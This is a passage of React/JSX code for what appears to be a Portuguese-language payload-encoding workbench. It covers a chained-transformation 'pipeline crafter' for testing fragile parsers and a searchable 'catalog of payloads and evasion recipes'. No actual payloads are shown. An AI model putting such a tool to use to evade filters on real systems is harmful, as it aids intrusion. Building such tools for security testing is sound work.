                      <div className="flex items-center gap-2">
                        <span className="text-[10px] text-zinc-400">Entropia: {step.entropy}</span>
                        <button
                          type="button"
                          onClick={() => handleCopy(`peel-step-${idx}`, step.output)}
                          className="text-zinc-400 hover:text-white flex items-center gap-1 cursor-pointer"
                        >
                          {copiedKey === `peel-step-${idx}` ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                        </button>
                      </div>
                    </div>
                    <pre className="p-3 rounded-lg bg-[#0c0c12] border border-[#1e1e2c] text-emerald-300 font-mono text-xs overflow-x-auto break-all">
                      {step.output}
                    </pre>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* MODE 4: PIPELINE CRAFTER */}
      {/* ========================================================================= */}
      {viewMode === 'PIPELINE_CRAFTER' && (
        <div className="space-y-6">
          <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-4 shadow-lg">
            <div className="flex items-center justify-between border-b border-[#1e1e28] pb-3">
              <div className="space-y-0.5">
                <h3 className="text-sm font-bold text-white flex items-center gap-2">
                  <Cpu className="w-4 h-4 text-cyan-400" />
                  <span>Pipeline de Transformações Encadeadas</span>
                </h3>
                <p className="text-xs text-zinc-400">
                  Aplique múltiplos filtros em cascata (ex: SQL comment ➔ Base64 ➔ URL Encode) para testar parsers frágeis.
                </p>
              </div>
            </div>

            <textarea
              rows={2}
              value={pipelineInput}
              onChange={e => setPipelineInput(e.target.value)}
              placeholder="String inicial..."
              className="w-full px-3.5 py-2 rounded-xl bg-[#0c0c10] border border-[#232330] text-cyan-300 font-mono text-xs focus:outline-none focus:border-cyan-500/50 resize-none leading-relaxed"
            />

            {/* Stages */}
            <div className="space-y-3">
              {pipelineStages.map((stage, idx) => (
                <div key={idx} className="bg-[#151522] border border-[#252538] rounded-xl p-3.5 space-y-1.5">
                  <div className="flex items-center justify-between text-xs font-mono">
                    <span className="font-bold text-white">Etapa {idx + 1}: {stage.label}</span>
                    <button
                      type="button"
                      onClick={() => handleCopy(`pipe-${idx}`, stage.result)}
                      className="text-zinc-400 hover:text-white flex items-center gap-1 cursor-pointer"
                    >
                      <Copy className="w-3 h-3" />
                      <span>Copiar</span>
                    </button>
                  </div>
                  <pre className="p-2.5 rounded-lg bg-[#0c0c10] border border-[#1f1f2e] text-cyan-300 font-mono text-xs overflow-x-auto break-all">
                    {stage.result}
                  </pre>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}

      {/* ========================================================================= */}
      {/* MODE 5: RECIPES CATALOG */}
      {/* ========================================================================= */}
      {viewMode === 'RECIPES' && (
        <div className="space-y-6">
          <div className="bg-[#121218] border border-[#22222d] rounded-2xl p-5 space-y-4 shadow-lg">
            <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-3 border-b border-[#1e1e28] pb-3">
              <div className="flex items-center gap-2">
                <Flame className="w-4 h-4 text-amber-400" />
                <h3 className="text-sm font-bold text-white">Catálogo de Payloads & Receitas de Evasão</h3>
              </div>
              <div className="relative w-full sm:w-64">
                <Search className="w-3.5 h-3.5 absolute left-3 top-1/2 -translate-y-1/2 text-zinc-500" />
                <input
                  type="text"
                  value={presetSearch}
                  onChange={e => setPresetSearch(e.target.value)}
                  placeholder="Buscar payloads..."
                  className="w-full bg-[#171722] border border-[#2a2a3b] rounded-xl pl-8 pr-3 py-1.5 text-xs font-mono text-white placeholder-zinc-500 focus:outline-none focus:border-cyan-400"
                />
              </div>
            </div>

            <div className="grid grid-cols-1 md:grid-cols-2 gap-3 max-h-[500px] overflow-y-auto pr-1">
              {filteredPresets.map(preset => (
                <div key={preset.id} className="bg-[#151520] border border-[#222230] rounded-xl p-3.5 space-y-2">
                  <div className="flex items-center justify-between text-xs font-mono">
                    <span className="font-bold text-white">{preset.name}</span>
                    <span className="text-[10px] px-1.5 py-0.2 rounded bg-amber-500/15 text-amber-300 border border-amber-500/30">
                      {preset.category}
                    </span>
                  </div>
                  <pre className="p-2 rounded-lg bg-[#0c0c10] border border-[#1f1f2e] text-cyan-300 font-mono text-xs overflow-x-auto break-all">
                    {preset.payload}
                  </pre>
                  <div className="flex items-center justify-between pt-1">
                    <span className="text-[10px] text-zinc-400">{preset.description}</span>
                    <button
                      type="button"
                      onClick={() => {
                        setInputText(preset.payload);
                        setViewMode('LIVE_WORKBENCH');
                        setWorkbenchSubMode('ENCODE');
                        showToast(`Payload ${preset.name} carregado no Workbench!`);
                      }}
                      className="px-2 py-1 rounded bg-[#20202e] hover:bg-[#2b2b3e] text-zinc-200 text-[10px] font-mono font-bold transition-colors cursor-pointer"
                    >
                      Carregar no Workbench
                    </button>
                  </div>
                </div>
              ))}
            </div>
          </div>
        </div>
      )}
    </div>
  );
};
